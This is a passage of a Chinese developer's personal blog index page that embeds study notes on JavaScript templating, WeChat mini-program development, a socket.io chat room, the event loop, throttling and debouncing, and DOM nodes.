&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; var template = &amp;quot;My name is  {{name}} ,I&#39;m  {{age}} ,Sex is {{sex}}&amp;quot;;
    
            console.log(template.replace(/\{\{(\w+)\}\}/g,function(a,b,c){
                console.log(a,b,c);
                return &#39;❤&#39;
            }));

/**
	b 找出了里面的内容 可以用来替换
	{{name}} name 12
	{{age}} age 27
	{{sex}} sex 43
 	My name is  ❤ ,I&#39;m  ❤ ,Sex is ❤*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; 
//进行函数封装
function likerender(template,data)
            {
                return template.replace(/\{\{(\w+)\}\}/g,function(findstr,$1){
                //匹配data对象里面的属性
                return data[$1]
                     });
            }

            var data={
                name:&#39;fanfan&#39;,
                age:18,
                sex:&#39;man&#39;
            }

            console.log(likerender(template,data));
		
//My name is  fanfan ,I&#39;m  18 ,Sex is man
&lt;/code&gt;&lt;/pre&gt;
">mustache</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/xiao-cheng-xu-kai-fa-ji-lu/"" data-c="
          &lt;h2 id=&#34;es6-map函数-选择作用&#34;&gt;ES6 map()函数 (选择作用)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;var users = [
{name: &amp;quot;张含韵&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;zhang@email.com&amp;quot;},
{name: &amp;quot;江一燕&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;jiang@email.com&amp;quot;},
{name: &amp;quot;李小璐&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;li@email.com&amp;quot;}
];

var emails = users.map(function (user) { return user.email; });

console.log(emails.join(&amp;quot;, &amp;quot;)); 

// zhang@email.com, jiang@email.com, li@email.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此方法用于我对于获取总数据中选择data里面的数组去选择我需要的部分&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;小程序本地储存&#34;&gt;小程序本地储存&lt;/h2&gt;
&lt;p&gt;wx.setStorageSync(&#39;key&#39;,&#39;value);&lt;/p&gt;
&lt;p&gt;wx.getStorageSync( &#39;key&#39;);&lt;/p&gt;
&lt;p&gt;web中存数据会先调用toString() 把数据变为字符串 再进行储存&lt;/p&gt;
&lt;p&gt;小程序存的数据什么类型 获取的就是什么类型&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;onloadoption&#34;&gt;onload(option)&lt;/h2&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;​	//option里面包含我从其他页面跳转url带参的参数&lt;/p&gt;
&lt;p&gt;}&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;组件的子传父-父传子&#34;&gt;组件的子传父 父传子&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 监听自定义事件 bindtabsitemchange是子组件向父组件传值加bind --&amp;gt;
&amp;lt;tab tabs=&amp;quot;{{tabs}}&amp;quot; bindtabsitemchange=&amp;quot;handitemchange&amp;quot;&amp;gt;&amp;lt;/tab&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;子组件接受参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; properties: {
    tabs:{
      type:Array,
      value:[]
    }
  },
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;子组件向父组件传值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  methods: {
      //点击事件
      handleitemtap(e)
      {
        const {index}=e.currentTarget.dataset
        this.triggerEvent(&amp;quot;tabsitemchange&amp;quot;,{index} )
      }
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;父组件对传值的处理&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//tab子组件点击事件
handitemchange(e)
{
  console.log(e);
  //获取被点击的标题索引
  const {index}=e.detail;
  let {tabs}=this.data
  tabs.forEach((value,i)=&amp;gt;i==index?value.isactive=true:value.isactive=false)
  this.setData({
      //更新父组件的内容
    tabs
  })
  
},
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
## 用到的周期函数
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//只用加载该页面才调用  
  onLoad: function (options) {
      console.log(options);
      this.qureyparams.cid=options.cid
      console.log(this.qureyparams);
      this.getgoodslist()
  },

       //每次回到该页面就会调用
     onShow(){
         ...
     },
      
//页面滚动条触底事件 要判断是否有下一页数据 总页数 页码   页码*获取条数&amp;gt;=总数据 没有下一页
  onReachBottom()
  {
      //判断是否还有下一页
      if(this.qureyparams.pagenum&amp;gt;=this.totalpagesize)
      {
        //给个提示
        wx.showToast({
          title:&#39;&#39;,
          icon:&#39;none&#39;,
          duration:1500,
         
        })
      }
      else{
     
         this.qureyparams.pagenum++
        console.log(this.qureyparams.pagenum);
        this.getgoodslist()
      }
  },
	
//下拉刷新触发函数 
  onPullDownRefresh(){
      //1 重置数组
      this.setData({
        goodslist:[]
      })
      //重置页数
      this.qureyparams.pagenum=1
      //重新发请求
      this.getgoodslist()
      //在方法里面手动关闭下拉刷新等待效果
      //（ wx.stopPullDownRefresh()）
  },
      
      
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于下拉刷新可以在需要的文件下加&lt;code&gt;&amp;quot;enablePullDownRefresh&amp;quot;: true&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;也可以在app.json全局加刷新效果 包括下拉刷新的样式也是可以添加的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  &amp;quot;window&amp;quot;:{
    &amp;quot;backgroundTextStyle&amp;quot;:&amp;quot;light&amp;quot;,
    &amp;quot;navigationBarBackgroundColor&amp;quot;: &amp;quot;#eb4450&amp;quot;,
    &amp;quot;navigationBarTitleText&amp;quot;: &amp;quot;fanfan&amp;quot;,
    &amp;quot;navigationBarTextStyle&amp;quot;:&amp;quot;white&amp;quot;,

    &amp;quot;backgroundColor&amp;quot;: &amp;quot;#0094ff&amp;quot;

  },
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;对于下拉加载新数据的方法&#34;&gt;对于下拉加载新数据的方法&lt;/h2&gt;
&lt;p&gt;先对原先数据进行解构后，把新数据加进去，而不是刷新数组&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; this.setData({
      goodslist:[...this.data.goodslist,...res.data.message.goods]
    })
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;小程序对于用户权限调用以及获取&#34;&gt;小程序对于用户权限调用以及获取&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//权限给与设置  ***
  //调用小程序内置api 获取用户的收货地址 追踪授权状态 SCOPE
  //增加收货地址
  handleaddress() {

    //打印授权的状态
    wx.getSetting({
      success: (res) =&amp;gt; { 
        console.log(res);
        //判断用户是否给权限
        const scopeaddress = res.authSetting[&amp;quot;scope.address&amp;quot;]
        //用户同意权限 直接调用
        if (scopeaddress || scopeaddress == undefined) {
          wx.chooseAddress({
            success: (result) =&amp;gt; {
              //存地址到缓存
              wx.setStorageSync(&#39;address&#39;, result);
              console.log(result);
            },
          });
        }
        //如果没给 调用接口让用户同意  打开授权页面
        else {
          wx.openSetting({
            success: (result) =&amp;gt; {
              console.log(result);
              //调用用户同意权限接口
              wx.chooseAddress({
                success: (res) =&amp;gt; {
                  wx.setStorageSync(&#39;address&#39;, res);
                  console.log(res);

                },

              });
            },

          });
        }
      },
    });
  },

&lt;/code&gt;&lt;/pre&gt;
"> 微信小程序开发记录</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/socketio-shi-xian-shi-shi-liao-tian-shi/"" data-c="
          &lt;p&gt;&lt;strong&gt;Node.js&lt;/strong&gt;部分（服务端）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  var express=require(&#39;express&#39;)
var app=express()
var server=require(&#39;http&#39;).createServer(app)
var io=require(&#39;socket.io&#39;)(server)

app.use(express.static(__dirname+&#39;/public&#39;))

//设置允许跨域
app.all(&#39;*&#39;, function (req, res, next) {
      res.header(&amp;quot;Access-Control-Allow-Credentials&amp;quot;, true)
      res.header(&amp;quot;Access-Control-Allow-Origin&amp;quot;, &amp;quot;*&amp;quot;)
      res.header(&amp;quot;Access-Control-Allow-Headers&amp;quot;, &amp;quot;X-Requested-With&amp;quot;)
      res.header(&amp;quot;Access-Control-Allow-Methods&amp;quot;, &amp;quot;PUT,POST,GET,DELETE,OPTIONS&amp;quot;)
      res.header(&amp;quot;X-Powered-By&amp;quot;, &#39; 3.2.1&#39;)
      res.header(&amp;quot;Content-Type&amp;quot;, &amp;quot;application/json;charset=utf-8&amp;quot;)
      next()
})

//放用户
const users=[]

io.on(&#39;connection&#39;,function(socket){
    console.log(&amp;quot;新用户加入房间&amp;quot;);

    //监听Login事件
    socket.on(&#39;login&#39;,(data)=&amp;gt;{
            console.log(data);
        //放数据,顺便增加唯一id
        users.push({...data,id:socket.id})

        console.log(&#39;id是&#39;+socket.id);
        //所有人广播
        io.emit(&#39;loginback&#39;,{...data,id:socket.id})
    })

    socket.on(&#39;client&#39;,data2=&amp;gt;{
        console.log(data2.value);
        data2.users=users.find(u=&amp;gt;u.id==socket.id)
        console.log(data2.users);
        socket.broadcast.emit(&#39;sendmes&#39;,data2)
    })
    
})

server.listen(3000,()=&amp;gt;{
    console.log(&#39;http://127.0.0.1:3000&#39;);
})

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;前端部分&#34;&gt;前端部分&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;

&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
  &amp;lt;title&amp;gt;Socket聊天室&amp;lt;/title&amp;gt;
  &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
    /**输入框样式*/
    .text * {
      margin: 0;
      padding: 0;
    }

    #main {
      text-align: center;
    }

    #showmes {
      position: relative;
      background: url(https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fcdn.duitang.com%2Fuploads%2Fitem%2F201209%2F08%2F20120908134318_YVAwx.jpeg&amp;amp;refer=http%3A%2F%2Fcdn.duitang.com&amp;amp;app=2002&amp;amp;size=f9999,10000&amp;amp;q=a80&amp;amp;n=0&amp;amp;g=0n&amp;amp;fmt=jpeg?sec=1626261869&amp;amp;t=964bbb79e059f74901698cdd5f6de691) no-repeat;
      background-size: 100% 110%;
      margin: auto;
      width: 600px;
      height: 600px;
      overflow: hidden;
      overflow-y: scroll;
    }

    /**别人气泡*/
    .leftspan2 {
      float: left;
      color: grey;
      font-weight: 1000;
      position: absolute;
      top: -18px;
      font-size: 3px;
      left: 25px;
    }

    .leftspan {
      color: white;
      background-color: #635f5fec;
      padding: 5px 8px;
      font-size: 14px;
      float: left;
      position: relative;
      border-radius: 4px;
      margin-left: 25px;
      margin-right: 5px;

    }

    .leftspan::after {
      content: &#39;&#39;;
      border: 8px solid #ffffff00;
      border-right: 8px solid #635f5fec;
      ;
      position: absolute;
      top: 6px;
      left: -16px;
    }

    /*自己气泡**/
    .pp {
      width: 100%;
      position: relative;
      min-height: 20px;
      float: right;
      margin-bottom: 15px;
    }

    .rightspan2 {
      float: right;
      color: grey;
      font-weight: 1000;
      position: absolute;
      top: -18px;
      font-size: 3px;
      right: 15px;
    }

    .rightspan {
      float: right;
      position: relative;
      color: rgb(2, 2, 2);
      font-weight: 500;
      background-color: #88e99d;
      padding: 5px 8px;
      font-size: 14px;
      border-radius: 4px;
      margin-left: 5px;
      margin-right: 15px;

    }

    .rightspan::after {
      content: &#39;&#39;;
      border: 8px solid #ffffff00;
      border-left: 8px solid #88e99d;
      ;
      position: absolute;
      top: 6px;
      right: -13px;

    }

    /**输入框*/
    #text {
      width: 500px;
      height: 25px;
    }
  &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;

  &amp;lt;div id=&amp;quot;joinname&amp;quot;&amp;gt;
    &amp;lt;span&amp;gt;请输入加入的姓名&amp;lt;/span&amp;gt; &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;name&amp;quot;&amp;gt;&amp;lt;button onclick=&amp;quot;joinchat()&amp;quot;&amp;gt;提交&amp;lt;/button&amp;gt;
  &amp;lt;/div&amp;gt;
  &amp;lt;div id=&amp;quot;main&amp;quot; style=&amp;quot;display: none;&amp;quot;&amp;gt;
    
    &amp;lt;h1&amp;gt;fanfan的聊天室&amp;lt;/h1&amp;gt;
    &amp;lt;div id=&amp;quot;showmes&amp;quot;&amp;gt;

    &amp;lt;/div&amp;gt;
    &amp;lt;div class=&amp;quot;inputtxt&amp;quot;&amp;gt;
      &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;text&amp;quot;&amp;gt;&amp;lt;/input&amp;gt;
      &amp;lt;button id=&amp;quot;btn&amp;quot; onclick=&amp;quot;sendmes()&amp;quot;&amp;gt;发送&amp;lt;/button&amp;gt;
    &amp;lt;/div&amp;gt;

  &amp;lt;/div&amp;gt;

  &amp;lt;script src=&amp;quot;/socket.io/socket.io.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script&amp;gt;
    //全局变量
    name = &#39;&#39;
    var socket = io(); //连接聊天室的io服务器 io服务器的根地址
    //连接进聊天室
    function firstjoin() {

      socket.on(&#39;hello&#39;, data =&amp;gt; {
        console.log(&#39;服务端发送的东西为：&#39; + data);
      })
    }

    function notnull() {
      if (document.getElementById(&#39;text&#39;).value != &#39;&#39;) {
        return 1;
      }
      else {
        return 0;
      }
    }
    //自己发信息
    function sendmes() {
      if (notnull()) {
        var mes = document.getElementById(&#39;text&#39;).value
        var p = document.createElement(&#39;p&#39;);
        var span = document.createElement(&#39;span&#39;)
        var span2 = document.createElement(&#39;span&#39;)
        span.innerHTML = mes;
        span2.innerHTML = name;
        span2.className = &#39;rightspan2&#39;
        span.className = &#39;rightspan&#39;
        p.className = &#39;pp&#39;
        p.appendChild(span2)
        p.appendChild(span)
        document.getElementById(&#39;showmes&#39;).appendChild(p)
        socket.emit(&#39;client&#39;, {&#39;value&#39;:document.getElementById(&#39;text&#39;).value,&#39;name&#39;:name})
        document.getElementById(&#39;text&#39;).value = &#39;&#39;

        document.getElementById(&amp;quot;showmes&amp;quot;).scrollTop += document.getElementById(&amp;quot;showmes&amp;quot;).offsetHeight;
      }

    }
    //收到别人发的信息
    socket.on(&#39;sendmes&#39;, data =&amp;gt; {
      console.log(data);
      var p = document.createElement(&#39;p&#39;);
      var span = document.createElement(&#39;span&#39;);
      var span2 = document.createElement(&#39;span&#39;);
      span.className = &#39;leftspan&#39;
      console.log(&#39;姓名是&#39;+data.users.name);
      span2.innerHTML = data.users.name
      span2.className = &#39;leftspan2&#39;
      span.innerHTML = data.value;
      p.appendChild(span2)
      p.appendChild(span)
      p.className = &#39;pp&#39;

      document.getElementById(&#39;showmes&#39;).appendChild(p)

      document.getElementById(&amp;quot;showmes&amp;quot;).scrollTop += document.getElementById(&amp;quot;showmes&amp;quot;).offsetHeight;
    })

    //加入聊天室提醒
    function joinchat() {
      if (document.getElementById(&#39;name&#39;).value.length &amp;gt;= 1 &amp;amp;&amp;amp; document.getElementById(&#39;name&#39;).value.length &amp;lt;= 6) {
        //加入盒子隐藏 聊天盒子显示
        document.getElementById(&#39;main&#39;).style.display=&#39;block&#39;
        document.getElementById(&#39;joinname&#39;).style.display=&#39;none&#39;
        name=document.getElementById(&#39;name&#39;).value
        socket.emit(&#39;login&#39;, { &#39;name&#39;: document.getElementById(&#39;name&#39;).value })
      }

    }
    socket.on(&#39;loginback&#39;, data =&amp;gt; {
      var p = document.createElement(&#39;p&#39;);
      p.innerHTML = data.name + &#39;加入了房间&#39;;
      p.style.color = &#39;grey&#39;
      p.style.fontWeight = &#39;1000&#39;
      p.style.textAlign = &#39;center&#39;
      p.style.fontSize = &#39;6px&#39;
      document.getElementById(&#39;showmes&#39;).appendChild(p)
    })
    //回车发送消息
    document.onkeydown = function (e) {
      console.log(&#39;1&#39;);
      var ev = document.all ? window.event : e;
      if (ev.keyCode == 13) {
        sendmes();
      }
    }
  &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
每次进入页面先输入自己的姓名才能进入聊天室
每个客户端对应自己独特的socket id来获取发送消息的名称
给回车绑定事件，每次回车发送 可以实现多人在线实时聊天，且有自己对应的名称 自己发送的消息和收到的消息进行区分
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210616015910759.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210616015915621.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210616015921537.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210616015925385.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210616015929804.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/image-20210616015931812.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;file://C:/Users/16239/AppData/Roaming/Typora/typora-user-images/mage-20210616015934765.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">socket.io实现实时聊天室</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shi-jian-xun-huan/"" data-c="
          &lt;p&gt;JS为单线程&lt;br&gt;
宏任务主要包含：script( 整体代码)、setTimeout、setInterval、I/O、UI 交互事件、setImmediate(Node.js 环境)&lt;/p&gt;
&lt;p&gt;微任务主要包含：Promise、MutaionObserver、process.nextTick(Node.js 环境)&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1623256115003.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;例子1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;console.log(&#39;script start&#39;);

setTimeout(function() {
  console.log(&#39;timeout1&#39;);
}, 10);

new Promise(resolve =&amp;gt; {
    console.log(&#39;promise1&#39;);
    resolve();
    setTimeout(() =&amp;gt; console.log(&#39;timeout2&#39;), 10);
}).then(function() {
    console.log(&#39;then1&#39;)
})

console.log(&#39;script end&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1623255042505.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
先执行第一个log&lt;/p&gt;
&lt;p&gt;setTimeout推入宏队列hong1&lt;/p&gt;
&lt;p&gt;遇到promise马上执行打印然后将它所有的then推入微队列后把setTimeout推入宏队列hong2&lt;/p&gt;
&lt;p&gt;先执行微队列，所以先打印then里面的。然后宏队列再打印&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
例子2&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  console.log(&#39;1&#39;);

setTimeout(function() {
    console.log(&#39;2&#39;);
  
    new Promise(function(resolve) {
        console.log(&#39;4&#39;);
        resolve();
    }).then(function() {
        console.log(&#39;5&#39;)
    })
})

new Promise(function(resolve) {
    console.log(&#39;7&#39;);
    resolve();
}).then(function() {
    console.log(&#39;8&#39;)
})

setTimeout(function() {
    console.log(&#39;9&#39;);
   
    new Promise(function(resolve) {
        console.log(&#39;11&#39;);
        resolve();
    }).then(function() {
        console.log(&#39;12&#39;)
    })
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1623255137440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
当在只剩两个宏任务的setTimeout时候执行第一个时，Promise压入了then的微任务，让第二个宏任务又排到微任务后等待&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;async和await&#34;&gt;async和await&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;await后面接一个会return new promise的函数并执行它&lt;/li&gt;
&lt;li&gt;await只能放在async函数里&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function 摇色子(){
    return new Promise((resolve, reject)=&amp;gt;{
        let sino = parseInt(Math.random() * 6 +1)
        setTimeout(()=&amp;gt;{
            resolve(sino)
        },3000)
    })
}
async function test(){
    let n =await 摇色子()
    console.log(n)
}
test()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;async函数会返回一个promise，并且Promise对象的状态值是resolved（成功的）
&lt;ul&gt;
&lt;li&gt;如果你没有在async函数中写return，那么Promise对象resolve的值就是是undefined&lt;/li&gt;
&lt;li&gt;如果你写了return，那么return的值就会作为你成功的时候传入的值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;await 等到之后，做了一件什么事情？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不是promise对象&lt;/li&gt;
&lt;li&gt;是promise对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果不是 promise , await会阻塞后面的代码，先执行async外面的同步代码，同步代码执行完，再回到async内部，把这个非promise的东西，作为 await表达式的结果。&lt;br&gt;
如果它等到的是一个 promise 对象，await 也会暂停async后面的代码，先执行async外面的同步代码，等着 Promise 对象 fulfilled，然后把 resolve 的参数作为 await 表达式的运算结果。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果asycn里的代码都是同步的，那么这个函数被调用就会同步执行&lt;/li&gt;
&lt;li&gt;如果在await后面接的这个promsie都是同步的，后面的promise会同步执行&lt;/li&gt;
&lt;li&gt;如果await里面的promise没有resolve()的成功函数就不会执行await下面的线程了&lt;/li&gt;
&lt;/ul&gt;
">事件循环</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-zhi-shi-dian/"" data-c="
          &lt;h2 id=&#34;节流和防抖&#34;&gt;节流和防抖&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;防抖&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; //防抖 在第一次触发事件时，不立即执行函数，而是给出一个期限值比如200ms  用于停止动作后才开始触发的
    function debounce(fn,delay){
        let timer=null;
        return function(){
            if(timer){
                clearTimeout(timer)//存在即重新计时
                
            }
              timer=setTimeout(fn,delay)
            
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;节流&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//节流 适合一直不给机会触发防抖的
    function throttle(fn,delay){
       
    let valid = true
    return function() {
        
        //闭包函数内的vaild为同一个
       if(!valid){
           
           return false 
       }
       
        valid = false//防止多次触发
        
        setTimeout(() =&amp;gt; {
            fn()
            valid = true;
        }, delay)
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;判断是不是数组&#34;&gt;判断是不是数组&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var a=new Array()
var b=new Object()

console.log(Array instanceof Object); //true   js数组可以看作对象

console.log(Array.isArray(a)); //true   数组方法

//误区
typeof(a) //object  typeof运算符用于判断对象的类型，但是对于一些创建的对象，它们都会返回&#39;object&#39;  返回的类型 undefined&#39; &#39;boolean&#39; &#39;string&#39; &#39;number&#39; &#39;object&#39;  &#39;function&#39;

Object.prototype.toString.call(a) //Object Array 用来判断类型

Object.prototype.toString.call(b) //object Object

//Array 和 Function都是Object的实例 都重写了toString()方法 所以直接调用的话是重写后的方法 调用原型上的方法返回类型

//对toString()方法重写的证明
console.log(Array.prototype.hasOwnProperty(&amp;quot;toString&amp;quot;));//true

delete Array.prototype.toString;//delete操作符可以删除实例属性

console.log(arr.toString());//&amp;quot;[object Array]&amp;quot;


//  prototype 和__proto__    一般来说 __proto__==constructor.prototype


&lt;/code&gt;&lt;/pre&gt;
">JS 节流和防抖 判断数组</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/dom/"" data-c="
          &lt;h2 id=&#34;节点层次&#34;&gt;节点层次&lt;/h2&gt;
&lt;h2 id=&#34;nodename-和-nodevalue-属性&#34;&gt;nodeName 和 nodeValue 属性&lt;/h2&gt;
&lt;p&gt;if(someNode.nodeType == 1)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;//先确定是个元素&lt;/p&gt;
&lt;p&gt;value = someNode.nodeName;   //nodeName 的值是元素的标签名&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;p&gt;对于元素节点，nodeName 中保存的始终都是元素的标签名，而 nodeValue 的值则始终为 null。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;节点关系&#34;&gt;节点关系&lt;/h2&gt;
&lt;p&gt;每个节点都有一个 **childNodes **属性，其中保存着一个 **NodeList **对象。**NodeList **是一种类数组 对象，用于保存一组有序的节点&lt;/p&gt;
&lt;p&gt;val.childNodes[0]   //如果是标签之间有空隙 默认为文字  打印出  #text&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;子节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;nextSibling&lt;/p&gt;
&lt;p&gt;previousSibling&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;父节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;firstChild&lt;/p&gt;
&lt;p&gt;lastChild&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看是否有子节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;val.hasChildNodes()  //boolean&lt;/p&gt;
&lt;h2 id=&#34;操作节点&#34;&gt;操作节点&lt;/h2&gt;
&lt;p&gt;**appendChild()**和 **insertBefore()**方法都只插入节点&lt;/p&gt;
&lt;p&gt;**replaceChild()**方法接受的两个参数是：要插入的节点和要替换的节点。尽管从技术上讲，被替换的节点仍然还在文档中，但它在文档中已经没有了自己的位置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;removeChild()&lt;/strong&gt; 即要移除 的节点。被移除的节点将成为方法的返回值&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cloneNode()&lt;/strong&gt; 用于创建调用这个方法的节点 的一个完全相同的副本，接受一个布尔值参数，表示是否执行深复制&lt;/p&gt;
&lt;h2 id=&#34;document类型&#34;&gt;Document类型&lt;/h2&gt;
&lt;p&gt; nodeType 的值为 9；&lt;/p&gt;
&lt;p&gt; nodeName 的值为&amp;quot;#document&amp;quot;；、&lt;/p&gt;
&lt;p&gt; nodeValue 的值为 null；&lt;/p&gt;
&lt;p&gt; parentNode 的值为 null；&lt;/p&gt;
&lt;p&gt; ownerDocument 的值为 null；&lt;/p&gt;
&lt;p&gt; 其子节点可能是一个 DocumentType（最多一个）、Element（最多一个）、ProcessingInstruction 或 Comment。&lt;/p&gt;
&lt;p&gt;//设置文档标题&lt;/p&gt;
&lt;p&gt;document.title = &amp;quot;New page title&amp;quot;;&lt;/p&gt;
&lt;p&gt;//取得完整的 URL&lt;/p&gt;
&lt;p&gt;var url = document.URL;&lt;/p&gt;
&lt;p&gt;//取得域名&lt;/p&gt;
&lt;p&gt;var domain = document.domain;&lt;/p&gt;
&lt;p&gt;//取得来源页面的 URL&lt;/p&gt;
&lt;p&gt;var referrer = document.referrer;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;星号（*）通常表示“全部”。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var allElements = document.getElementsByTagName(&amp;quot;*&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 IE 中调用getElementsByTagName(&amp;quot;*&amp;quot;)将会返回所有注释节点&lt;/p&gt;
&lt;h2 id=&#34;element类型&#34;&gt;Element类型&lt;/h2&gt;
